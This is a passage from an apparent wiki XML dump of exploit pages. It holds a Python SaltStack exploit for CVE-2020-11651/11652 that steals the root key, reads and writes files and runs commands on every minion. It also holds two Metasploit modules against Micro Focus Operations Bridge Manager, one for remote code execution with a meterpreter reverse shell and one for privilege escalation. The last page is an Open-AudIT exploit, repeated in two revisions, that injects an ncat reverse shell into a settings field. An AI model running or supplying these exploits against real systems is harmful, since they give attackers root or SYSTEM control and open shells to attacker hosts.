def check_connection(master_ip, master_port, channel):
  print("[+] Checking salt-master ({}:{}) status... ".format(master_ip, master_port), end='')
  sys.stdout.flush()

  # connection check
  try:
    channel.send({'cmd':'ping'}, timeout=2)
  except salt.exceptions.SaltReqTimeoutError:
    print("OFFLINE")
    sys.exit(1)
  else:
    print("ONLINE")

def check_CVE_2020_11651(channel):
  print("[+] Checking if vulnerable to CVE-2020-11651... ", end='')
  sys.stdout.flush()

  try:
    rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3)
  except:
    print('ERROR')
    return None
  else:
    pass
  finally:
    if rets:
      print('YES')
      root_key = rets[2]['root']
      return root_key

  print('NO')
  return None

def check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path):
  print("[+] Checking if vulnerable to CVE-2020-11652 (read_token)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'cmd': 'get_token',
    'arg': [],
    'token': top_secret_file_path,
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("YES")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    print("NO")
  
def check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (read)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'file_roots.read',
    'path': top_secret_file_path,
    'saltenv': 'base',
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    if rets['data']['return']:
      print("YES")
    else:
      print("NO")

def check_CVE_2020_11652_write1(debug, channel, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (write1)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'file_roots.write',
    'path': '../../../../../../../../tmp/salt_CVE_2020_11652',
    'data': 'evil',
    'saltenv': 'base',
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)

    pp(rets)
    if rets['data']['return'].startswith('Wrote'):
      try:
        os.remove('/tmp/salt_CVE_2020_11652')
      except OSError:
        print("Maybe?")
      else:
        print("YES")
    else:
      print("NO")

def check_CVE_2020_11652_write2(debug, channel, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (write2)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'config.update_config',
    'file_name': '../../../../../../../../tmp/salt_CVE_2020_11652',
    'yaml_contents': 'evil',
    'saltenv': 'base',
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    if rets['data']['return'].startswith('Wrote'):
      try:
        os.remove('/tmp/salt_CVE_2020_11652.conf')
      except OSError:
        print("Maybe?")
      else:
        print("YES")
    else:
      print("NO")

def pwn_read_file(channel, root_key, path, master_ip):
    print("[+] Attemping to read {} from {}".format(path, master_ip))
    sys.stdout.flush()

    msg = {
        'key': root_key,
        'cmd': 'wheel',
        'fun': 'file_roots.read',
        'path': path,
        'saltenv': 'base',
    }

    rets = channel.send(msg, timeout=3)
    print(rets['data']['return'][0][path])

def pwn_upload_file(channel, root_key, src, dest, master_ip):
    print("[+] Attemping to upload {} to {} on {}".format(src, dest, master_ip))
    sys.stdout.flush()

    try:
        fh = open(src, 'rb')
        payload = fh.read()
        fh.close()
    except Exception as e:
        print('[-] Failed to read {}: {}'.format(src, e))
        return

    msg = {
        'key': root_key,
        'cmd': 'wheel',
        'fun': 'file_roots.write',
        'saltenv': 'base',
        'data': payload,
        'path': dest,
    }

    rets = channel.send(msg, timeout=3)
    print('[ ] {}'.format(rets['data']['return']))

def pwn_exec(channel, root_key, cmd, master_ip, jid):
    print("[+] Attemping to execute {} on {}".format(cmd, master_ip))
    sys.stdout.flush()

    msg = {
        'key': root_key,
        'cmd': 'runner',
        'fun': 'salt.cmd',
        'saltenv': 'base',
        'user': 'sudo_user',
        'kwarg': {
            'fun': 'cmd.exec_code',
            'lang': 'python',
            'code': "import subprocess;subprocess.call('{}',shell=True)".format(cmd)
        },
        'jid': jid,
    }

    try:
        rets = channel.send(msg, timeout=3)
    except Exception as e:
        print('[-] Failed to submit job')
        return

    if rets.get('jid'):
        print('[+] Successfully scheduled job: {}'.format(rets['jid']))

def pwn_exec_all(channel, root_key, cmd, master_ip, jid):
    print("[+] Attemping to execute '{}' on all minions connected to {}".format(cmd, master_ip))
    sys.stdout.flush()

    msg = {
        'key': root_key,
        'cmd': '_send_pub',
        'fun': 'cmd.run',
        'user': 'root',
        'arg': [ "/bin/sh -c '{}'".format(cmd) ],
        'tgt': '*',
        'tgt_type': 'glob',
        'ret': '',
        'jid': jid
    }

    try:
        rets = channel.send(msg, timeout=3)
    except Exception as e:
        print('[-] Failed to submit job')
        return
    finally:
        if rets == None:
            print('[+] Successfully submitted job to all minions.')
        else:
            print('[-] Failed to submit job')


def main():
    parser = argparse.ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652')
    parser.add_argument('--master', '-m', dest='master_ip', default='127.0.0.1')
    parser.add_argument('--port', '-p', dest='master_port', default='4506')
    parser.add_argument('--force', '-f', dest='force', default=False, action='store_false')
    parser.add_argument('--debug', '-d', dest='debug', default=False, action='store_true')
    parser.add_argument('--run-checks', '-c', dest='run_checks', default=False, action='store_true')
    parser.add_argument('--read', '-r', dest='read_file')
    parser.add_argument('--upload-src', dest='upload_src')
    parser.add_argument('--upload-dest', dest='upload_dest')
    parser.add_argument('--exec', dest='exec', help='Run a command on the master')
    parser.add_argument('--exec-all', dest='exec_all', help='Run a command on all minions')
    args = parser.parse_args()

    print("[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.")
    time.sleep(1)

    # Both src and destination are required for uploads
    if (args.upload_src and args.upload_dest is None) or (args.upload_dest and args.upload_src is None):
        print('[-] Must provide both --upload-src and --upload-dest')
        sys.exit(1)

    channel = init_minion(args.master_ip, args.master_port)

    check_connection(args.master_ip, args.master_port, channel)
    
    root_key = check_CVE_2020_11651(channel)
    if root_key:
        print('[*] root key obtained: {}'.format(root_key))
    else:
        print('[-] Failed to find root key...aborting')
        sys.exit(127)

    if args.run_checks:
        # Assuming this check runs on the master itself, create a file with "secret" content
        # and abuse CVE-2020-11652 to read it.
        top_secret_file_path = '/tmp/salt_cve_teta'
        with salt.utils.fopen(top_secret_file_path, 'w') as fd:
            fd.write("top secret")

        # Again, this assumes we're running this check on the master itself
        with salt.utils.fopen('/var/cache/salt/master/.root_key') as keyfd:
            root_key = keyfd.read()

        check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path)
        check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key)
        check_CVE_2020_11652_write1(debug, channel, root_key)
        check_CVE_2020_11652_write2(debug, channel, root_key)
        os.remove(top_secret_file_path)
        sys.exit(0)

    if args.read_file:
        pwn_read_file(channel, root_key, args.read_file, args.master_ip)

    if args.upload_src:
        if os.path.isabs(args.upload_dest):
            print('[-] Destination path must be relative; aborting')
            sys.exit(1)
        pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip)


    jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow())

    if args.exec:
        pwn_exec(channel, root_key, args.exec, args.master_ip, jid)

    if args.exec_all:
        print("[!] Lester, is this what you want? Hit ^C to abort.")
        time.sleep(2)
        pwn_exec_all(channel, root_key, args.exec_all, args.master_ip, jid)


if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>tagicqx2jwwhlp08rapq8vsyyludttn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-11853 Micro Focus Operations Bridge Manager 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>3127</id>
    <revision>
      <id>3630</id>
      <timestamp>2021-05-30T02:53:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule &lt; Msf::..."</comment>
      <origin>3630</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6311" sha1="itgeuvtxsp6yo4okncze6j8efol5hrp" xml:space="preserve">&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Java::HTTP::ClassLoader
  prepend Msf::Exploit::Remote::AutoCheck
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Micro Focus Operations Bridge Manager Authenticated Remote Code Execution',
        'Description' =&gt; %q{
          This module exploits an authenticated Java deserialization that affects a truckload of Micro
          Focus products: Operations Bridge Manager, Application Performance Management, Data Center Automation,
          Universal CMDB, Hybrid Cloud Management and Service Management Automation. However this module
          was only tested on Operations Bridge Manager.
          Exploiting this vulnerability will result in remote code execution as the root user on Linux or
          the SYSTEM user on Windows.
          Authentication is required, the module user needs to login to the application and obtain the
          authenticated LWSSO_COOKIE_KEY, which should be fed to the module. Any authenticated user can
          exploit this vulnerability, even the lowest privileged ones.
          For more information refer to the advisory link below.
        },
        'Author' =&gt;
        [
          'Pedro Ribeiro &lt;pedrib[at]gmail.com&gt;', # Vulnerability discovery and Metasploit module
        ],
        'References' =&gt;
          [
            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBM.md'],
            [ 'CVE', '2020-11853'],
            [ 'ZDI', '20-1327'],
          ],
        'DisclosureDate' =&gt; '2020-10-28',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; 'java',
        'Arch' =&gt; ARCH_JAVA,
        'Privileged' =&gt; true,
        'Targets' =&gt; [
          ['Micro Focus Operations Bridge Manager &lt;= 2020.05 (and many other MF products)', {}]
        ],
        'DefaultTarget' =&gt; 0,
        'DefaultOptions' =&gt; {
          'PAYLOAD' =&gt; 'java/meterpreter/reverse_tcp'
        }
      )
    )

    register_options([
      Opt::RPORT(443),
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptBool.new('SSL', [true, 'Negotiate SSL/TLS', true]),
      OptString.new('LWSSO_COOKIE_KEY', [true, 'Authenticated LWSSO_COOKIE_KEY session cookie'])
    ])
  end

  def check
    res = send_request_cgi({
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path, '/topaz/login.jsp')
    })

    # unfortunately could not find an easy way to detect the version running, even when auth
    if res &amp;&amp; res.code == 200 &amp;&amp; res.body.include?('Login - Operations Bridge Manager')
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    # Start our HTTP server to provide remote classloading
    @classloader_uri = start_service

    unless @classloader_uri
      fail_with(Failure::BadConfig, 'Could not start remote classloader server')
    end

    print_good("Started remote classloader server at #{@classloader_uri}")

    # heh, we got two of these, let's pick one randomly!
    vuln_uri = [
      '/legacy/topaz/sitescope/conf/registration',
      '/legacy/topaz/sitescope/conf/download'
    ].sample

    # Send our remote classloader gadget to the target, triggering the vuln
    send_request_gadget(
      normalize_uri(target_uri.path, vuln_uri)
    )
  end

  # Convenience method to send our gadget to a URI
  def send_request_gadget(uri)
    print_status("Sending remote classloader gadget to #{full_uri(uri)}")

    send_request_raw({
      'method' =&gt; 'POST',
      'uri' =&gt; uri,
      'cookie' =&gt; "LWSSO_COOKIE_KEY=#{datastore['LWSSO_COOKIE_KEY']}",
      'headers' =&gt; { 'Content-Type' =&gt; 'application/octet-stream' },
      'data' =&gt; go_go_gadget
    }, 0)
  end

  # C3P0 payload generated with a ysoserial jar
  # The ysoserial jar needs to be built with c3p0 version 0.9.1.2 as that is what the target uses
  # See the advisory for details.
  #
  # java -jar ysoserial-0.0.6-SNAPSHOT-all-c3p0-0.9.1.2.jar C3P0 'http://whatever/:ExploitClass' | base64
  def go_go_gadget
    gadget = Rex::Text.decode_base64(
      &lt;&lt;~EOF
        rO0ABXNyAChjb20ubWNoYW5nZS52Mi5jM3AwLlBvb2xCYWNrZWREYXRhU291cmNlZoRH/BzETxgC
        AAB4cgA1Y29tLm1jaGFuZ2UudjIuYzNwMC5pbXBsLkFic3RyYWN0UG9vbEJhY2tlZERhdGFTb3Vy
        Y2UAAAAAAAAAAQMAAHhyADFjb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuUG9vbEJhY2tlZERhdGFT
        b3VyY2VCYXNlAAAAAAAAAAEDAAdJABBudW1IZWxwZXJUaHJlYWRzTAAYY29ubmVjdGlvblBvb2xE
        YXRhU291cmNldAAkTGphdmF4L3NxbC9Db25uZWN0aW9uUG9vbERhdGFTb3VyY2U7TAAOZGF0YVNv
        dXJjZU5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABRmYWN0b3J5Q2xhc3NMb2NhdGlvbnEAfgAE
        TAANaWRlbnRpdHlUb2tlbnEAfgAETAADcGNzdAAiTGphdmEvYmVhbnMvUHJvcGVydHlDaGFuZ2VT
        dXBwb3J0O0wAA3Zjc3QAIkxqYXZhL2JlYW5zL1ZldG9hYmxlQ2hhbmdlU3VwcG9ydDt4cHcCAAFz
        cgA9Y29tLm1jaGFuZ2UudjIubmFtaW5nLlJlZmVyZW5jZUluZGlyZWN0b3IkUmVmZXJlbmNlU2Vy
        aWFsaXplZGIZhdDRKsITAgAETAALY29udGV4dE5hbWV0ABNMamF2YXgvbmFtaW5nL05hbWU7TAAD
        ZW52dAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAEbmFtZXEAfgAJTAAJcmVmZXJlbmNldAAYTGph
        dmF4L25hbWluZy9SZWZlcmVuY2U7eHBwcHBzcgAWamF2YXgubmFtaW5nLlJlZmVyZW5jZejGnqKo
        6Y0JAgAETAAFYWRkcnN0ABJMamF2YS91dGlsL1ZlY3RvcjtMAAxjbGFzc0ZhY3RvcnlxAH4ABEwA
        FGNsYXNzRmFjdG9yeUxvY2F0aW9ucQB+AARMAAljbGFzc05hbWVxAH4ABHhwc3IAEGphdmEudXRp
        bC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwAL
        ZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFu
        Zy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHQADEV4cGxvaXRDbGFzc3QAEGh0
        dHA6Ly93aGF0ZXZlci90AAdleHBsb2l0cHBwdwQAAAAAeHcCAAF4
      EOF
    )

    # Replace length-prefixed placeholder strings with our own
    gadget.sub!("\x00\x10http://whatever/", packed_classloader_uri)
    gadget.sub!("\x00\x07exploit", packed_class_name)
    gadget.sub("\x00\x0cExploitClass", packed_class_name)
  end

  # Convenience method to pack the classloader URI as a length-prefixed string
  def packed_classloader_uri
    "#{[@classloader_uri.length].pack('n')}#{@classloader_uri}"
  end

end
&lt;/pre&gt;</text>
      <sha1>itgeuvtxsp6yo4okncze6j8efol5hrp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-11858 Micro Focus Operations Bridge Manager 本地權限提升漏洞</title>
    <ns>0</ns>
    <id>3130</id>
    <revision>
      <id>3633</id>
      <timestamp>2021-05-30T02:57:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule &lt; Msf::..."</comment>
      <origin>3633</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3742" sha1="7tyv0dldohy14k0dw8xfwkdepxzi6ca" xml:space="preserve">&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Windows::Powershell
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Micro Focus Operations Bridge Manager Local Privilege Escalation',
        'Description' =&gt; %q{
          This module exploits an incorrectly permissioned folder in Micro Focus Operations Bridge
          Manager.
          An unprivileged user (such as Guest) can drop a JSP file in an exploded WAR directory and
          then access it without authentication by making a request to the OBM server.
          This will result in automatic code execution as SYSTEM. This module has been tested on
          OBM 2020.05, but it should work out of the box on earlier versions too.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'Pedro Ribeiro &lt;pedrib[at]gmail.com&gt;', # Vulnerability discovery and Metasploit module
          ],
        'Platform' =&gt; 'win',
        'Privileged' =&gt; true,
        'SessionTypes' =&gt; ['meterpreter'],
        'Arch' =&gt; [ ARCH_X86, ARCH_X64 ],
        'Targets' =&gt;
          [
            [
              'Micro Focus Operations Bridge Manager &lt;= 2020.05',
              {
                'Path' =&gt; 'C:\HPBSM\AppServer\webapps\site.war\LB_Verify.jsp'
              }
            ]
          ],
        'References' =&gt;
          [
            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBM.md'],
            [ 'CVE', '2020-11858'],
            [ 'ZDI', '20-1326'],
          ],
        'DisclosureDate' =&gt; '2020-10-28',
        'DefaultTarget' =&gt; 0
      )
    )

    register_options([
      Opt::RPORT(443),
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptBool.new('SSL', [true, 'Negotiate SSL/TLS', true]),
    ])
  end

  def exploit
    unless session.type == 'meterpreter'
      fail_with(Failure::None, 'Only meterpreter sessions are supported')
    end

    unless have_powershell?
      fail_with(Failure::None, 'No Powershell is installed on the host')
    end

    # according to /lib/msf/core/post/file.rb this is not binary safe on Windows, but we don't care, it's JSP
    payload_jsp = Msf::Util::EXE.to_jsp(generate_payload_exe)
    write_file(target['Path'], payload_jsp)

    if datastore['SSL']
      prefix = 'https://'
      # Code below allows us to perform TLS requests to servers with self signed certs
      # In Powershell 5.1, we can simply use -SkipCertificateCheck, but in older versions we need this
      # Taken from https://stackoverflow.com/questions/11696944/powershell-v3-invoke-webrequest-https-error
      ps_cmd = %[
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@
$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
]
    else
      prefix = 'http://'
      ps_cmd = ''
    end

    uri = "#{prefix}127.0.0.1:#{datastore['RPORT']}#{datastore['TARGETURI']}topaz/LB_Verify.jsp"
    print_status("JSP dropped, calling it @ #{uri}")
    ps_cmd += "Invoke-WebRequest -Uri #{uri}"
    execute_script(ps_cmd)
  end
end
&lt;/pre&gt;</text>
      <sha1>7tyv0dldohy14k0dw8xfwkdepxzi6ca</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-12078 Open-AudIT v3.3.1 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>4506</id>
    <revision>
      <id>5185</id>
      <timestamp>2021-06-16T09:35:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Open-AudIT v3.3.1 &lt;/pre&gt;  ==EXP== &lt;pre&gt; #!/usr/bin/python3  # Exploit Title: Open-AudIT Professional v3.3.1 Remot..."</comment>
      <origin>5185</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4673" sha1="g23hgdfw4fq8jo5bb6asnj46jqrklre" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Open-AudIT v3.3.1
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
#!/usr/bin/python3

# Exploit Title: Open-AudIT Professional v3.3.1 Remote Code Execution
# Date: 22/04/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-8813
# Vendor Homepage: https://opmantek.com/
# Version: v3.3.1
# Tested on: Ubuntu 18.04 / PHP 7.2.24

import requests
import sys
import warnings
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import quote

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 6:
   print("[~] Usage : ./openaudit-exploit.py url username password ip port")
   exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

request = requests.session()

def inject_payload():
   configuration_path = url+"/en/omk/open-audit/configuration/90"
   data = 'data={"data":{"id":"90","type":"configuration","attributes":{"value":";ncat${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s${IFS};"}}}' % (ip, port)
   request.patch(configuration_path, data)
   print("[+] Payload injected in settings")


def start_discovery():
   discovery_path = url+"/en/omk/open-audit/discoveries/create"
   post_discovery_path = url+"/en/omk/open-audit/discoveries"
   scan_name = "".join([random.choice(string.ascii_uppercase) for i in range(10)])
   req = request.get(discovery_path)

   response = req.text
   soup = BeautifulSoup(response, "html5lib")
   token = soup.findAll('input')[5].get("value")
   buttons = soup.findAll("button")
   headers = {"Referer" : discovery_path}
   request_data = {
   "data[attributes][name]":scan_name,
   "data[attributes][other][subnet]":"10.10.10.1/24",
   "data[attributes][other][ad_server]":"",
   "data[attributes][other][ad_domain]":"",
   "submit":"",
   "data[type]":"discoveries",
   "data[access_token]":token,
   "data[attributes][complete]":"y",
   "data[attributes][org_id]":"1",
   "data[attributes][type]":"subnet",
   "data[attributes][devices_assigned_to_org]":"",
   "data[attributes][devices_assigned_to_location]":"",
   "data[attributes][other][nmap][discovery_scan_option_id]":"1",
   "data[attributes][other][nmap][ping]":"y",
   "data[attributes][other][nmap][service_version]":"n",
   "data[attributes][other][nmap][open|filtered]":"n",
   "data[attributes][other][nmap][filtered]":"n",
   "data[attributes][other][nmap][timing]":"4",
   "data[attributes][other][nmap][nmap_tcp_ports]":"0",
   "data[attributes][other][nmap][nmap_udp_ports]":"0",
   "data[attributes][other][nmap][tcp_ports]":"22,135,62078",
   "data[attributes][other][nmap][udp_ports]":"161",
   "data[attributes][other][nmap][timeout]":"",
   "data[attributes][other][nmap][exclude_tcp_ports]":"",
   "data[attributes][other][nmap][exclude_udp_ports]":"",
   "data[attributes][other][nmap][exclude_ip]":"",
   "data[attributes][other][nmap][ssh_ports]":"22",
   "data[attributes][other][match][match_dbus]":"",
   "data[attributes][other][match][match_fqdn]":"",
   "data[attributes][other][match][match_dns_fqdn]":"",
   "data[attributes][other][match][match_dns_hostname]":"",
   "data[attributes][other][match][match_hostname]":"",
   "data[attributes][other][match][match_hostname_dbus]":"",
   "data[attributes][other][match][match_hostname_serial]":"",
   "data[attributes][other][match][match_hostname_uuid]":"",
   "data[attributes][other][match][match_ip]":"",
   "data[attributes][other][match][match_ip_no_data]":"",
   "data[attributes][other][match][match_mac]":"",
   "data[attributes][other][match][match_mac_vmware]":"",
   "data[attributes][other][match][match_serial]":"",
   "data[attributes][other][match][match_serial_type]":"",
   "data[attributes][other][match][match_sysname]":"",
   "data[attributes][other][match][match_sysname_serial]":"",
   "data[attributes][other][match][match_uuid]":""

   }
   print("[+] Creating discovery ..")
   req = request.post(post_discovery_path, data=request_data, headers=headers, allow_redirects=False)
   disocvery_url = url + req.headers['Location'] + "/execute"
   print("[+] Triggering payload ..")
   print("[+] Check your nc ;)")
   request.get(disocvery_url)


def login():
   login_info = {
   "redirect_url": "/en/omk/open-audit",
   "username": username,
   "password": password
   }
   login_request = request.post(url+"/en/omk/open-audit/login", login_info)
   login_text = login_request.text
   if "There was an error authenticating" in login_text:
       return False
   else:
       return True

if login():
   print("[+] LoggedIn Successfully")
   inject_payload()
   start_discovery()
else:
   print("[-] Cannot login!")
&lt;/pre&gt;</text>
      <sha1>g23hgdfw4fq8jo5bb6asnj46jqrklre</sha1>
    </revision>
    <revision>
      <id>5186</id>
      <parentid>5185</parentid>
      <timestamp>2021-06-16T09:36:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5186</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4684" sha1="l1a3zynb2gm0krsgnq93ntsd38oyr74" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Open-AudIT v3.3.1
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
#!/usr/bin/python3

# Exploit Title: Open-AudIT Professional v3.3.1 Remote Code Execution
# Date: 22/04/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-8813
# Vendor Homepage: https://opmantek.com/
# Version: v3.3.1
# Tested on: Ubuntu 18.04 / PHP 7.2.24

import requests
import sys
import warnings
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import quote

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 6:
   print("[~] Usage : ./openaudit-exploit.py url username password ip port")
   exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

request = requests.session()

def inject_payload():
   configuration_path = url+"/en/omk/open-audit/configuration/90"
   data = 'data={"data":{"id":"90","type":"configuration","attributes":{"value":";ncat${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s${IFS};"}}}' % (ip, port)
   request.patch(configuration_path, data)
   print("[+] Payload injected in settings")


def start_discovery():
   discovery_path = url+"/en/omk/open-audit/discoveries/create"
   post_discovery_path = url+"/en/omk/open-audit/discoveries"
   scan_name = "".join([random.choice(string.ascii_uppercase) for i in range(10)])
   req = request.get(discovery_path)

   response = req.text
   soup = BeautifulSoup(response, "html5lib")
   token = soup.findAll('input')[5].get("value")
   buttons = soup.findAll("button")
   headers = {"Referer" : discovery_path}
   request_data = {
   "data[attributes][name]":scan_name,
   "data[attributes][other][subnet]":"10.10.10.1/24",
   "data[attributes][other][ad_server]":"",
   "data[attributes][other][ad_domain]":"",
   "submit":"",
   "data[type]":"discoveries",
   "data[access_token]":token,
   "data[attributes][complete]":"y",
   "data[attributes][org_id]":"1",
   "data[attributes][type]":"subnet",
   "data[attributes][devices_assigned_to_org]":"",
   "data[attributes][devices_assigned_to_location]":"",
   "data[attributes][other][nmap][discovery_scan_option_id]":"1",
   "data[attributes][other][nmap][ping]":"y",
   "data[attributes][other][nmap][service_version]":"n",
   "data[attributes][other][nmap][open|filtered]":"n",
   "data[attributes][other][nmap][filtered]":"n",
   "data[attributes][other][nmap][timing]":"4",
   "data[attributes][other][nmap][nmap_tcp_ports]":"0",
   "data[attributes][other][nmap][nmap_udp_ports]":"0",
   "data[attributes][other][nmap][tcp_ports]":"22,135,62078",
   "data[attributes][other][nmap][udp_ports]":"161",
   "data[attributes][other][nmap][timeout]":"",
   "data[attributes][other][nmap][exclude_tcp_ports]":"",
   "data[attributes][other][nmap][exclude_udp_ports]":"",
   "data[attributes][other][nmap][exclude_ip]":"",
   "data[attributes][other][nmap][ssh_ports]":"22",
   "data[attributes][other][match][match_dbus]":"",
   "data[attributes][other][match][match_fqdn]":"",
   "data[attributes][other][match][match_dns_fqdn]":"",
   "data[attributes][other][match][match_dns_hostname]":"",
   "data[attributes][other][match][match_hostname]":"",
   "data[attributes][other][match][match_hostname_dbus]":"",
   "data[attributes][other][match][match_hostname_serial]":"",
   "data[attributes][other][match][match_hostname_uuid]":"",
   "data[attributes][other][match][match_ip]":"",
   "data[attributes][other][match][match_ip_no_data]":"",
   "data[attributes][other][match][match_mac]":"",
   "data[attributes][other][match][match_mac_vmware]":"",
   "data[attributes][other][match][match_serial]":"",
   "data[attributes][other][match][match_serial_type]":"",
   "data[attributes][other][match][match_sysname]":"",
   "data[attributes][other][match][match_sysname_serial]":"",
   "data[attributes][other][match][match_uuid]":""

   }
   print("[+] Creating discovery ..")
   req = request.post(post_discovery_path, data=request_data, headers=headers, allow_redirects=False)
   disocvery_url = url + req.headers['Location'] + "/execute"
   print("[+] Triggering payload ..")
   print("[+] Check your nc ;)")
   request.get(disocvery_url)


def login():
   login_info = {
   "redirect_url": "/en/omk/open-audit",
   "username": username,
   "password": password
   }
   login_request = request.post(url+"/en/omk/open-audit/login", login_info)
   login_text = login_request.text
   if "There was an error authenticating" in login_text:
       return False
   else:
       return True

if login():
   print("[+] LoggedIn Successfully")
   inject_payload()
   start_discovery()
else:
   print("[-] Cannot login!")
&lt;/pre&gt;</text>
      <sha1>l1a3zynb2gm0krsgnq93ntsd38oyr74</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-12078 Open-AudIT v3.3.1 遠程命令執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4511</id>
    <revision>
      <id>5191</id>
      <timestamp>2021-06-16T09:37:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
